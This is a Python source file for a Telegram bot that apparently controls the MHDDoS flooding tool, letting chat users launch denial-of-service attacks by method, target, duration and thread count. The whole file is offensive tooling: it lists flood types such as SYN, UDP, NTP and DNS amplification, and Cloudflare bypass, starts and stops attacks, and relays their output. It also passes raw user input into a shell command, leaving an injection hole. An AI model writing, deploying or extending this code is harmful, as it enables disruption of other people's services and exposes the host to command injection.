import os
import subprocess
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message

API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

app = Client("mhddos_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Attack methods list
METHODS = [
    "GET", "POST", "OVH", "TCP", "UDP", "SYN", "DNS", "NTP", 
    "MEM", "ICMP", "MINECRAFT", "FIVEM", "CFB", "BYPASS"
]

@app.on_message(filters.command("start"))
async def start_command(client, message: Message):
    await message.reply(
        "🔥 **MHDDoS Bot Ready!**\n\n"
        "Commands:\n"
        "/attack <method> <target> <time> <threads>\n"
        "/methods - Show all methods\n"
        "/stop - Stop attack\n"
        "/status - Check status"
    )

@app.on_message(filters.command("methods"))
async def methods_command(client, message: Message):
    methods_text = "\n".join([f"• `{m}`" for m in METHODS])
    await message.reply(f"**Available Methods:**\n\n{methods_text}")

@app.on_message(filters.command("attack"))
async def attack_command(client, message: Message):
    parts = message.text.split()
    if len(parts) < 5:
        await message.reply("Usage: `/attack <method> <target> <time> <threads>`")
        return
    
    method, target, duration, threads = parts[1], parts[2], parts[3], parts[4]
    
    if method.upper() not in METHODS:
        await message.reply(f"Invalid method. Use /methods to see all.")
        return
    
    # Kill any existing attack
    subprocess.run(["pkill", "-f", "start.py"])
    
    await message.reply(f"🚀 **Starting Attack!**\nMethod: {method}\nTarget: {target}\nDuration: {duration}s\nThreads: {threads}")
    
    # Run MHDDoS
    cmd = f"python start.py {method} {target} {duration} {threads}"
    process = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    
    # Send output in chunks
    while True:
        line = await process.stdout.readline()
        if not line:
            break
        if line:
            await message.reply(f"`{line.decode().strip()}`")
    
    await message.reply("✅ **Attack Finished!**")

@app.on_message(filters.command("stop"))
async def stop_command(client, message: Message):
    subprocess.run(["pkill", "-f", "start.py"])
    await message.reply("🛑 **Attack Stopped!**")

@app.on_message(filters.command("status"))
async def status_command(client, message: Message):
    # Check if attack is running
    result = subprocess.run(["pgrep", "-f", "start.py"], capture_output=True)
    if result.stdout:
        await message.reply("⚡ **Attack is running!**")
    else:
        await message.reply("💤 **No attack running.**")

print("Bot Started!")
app.run()
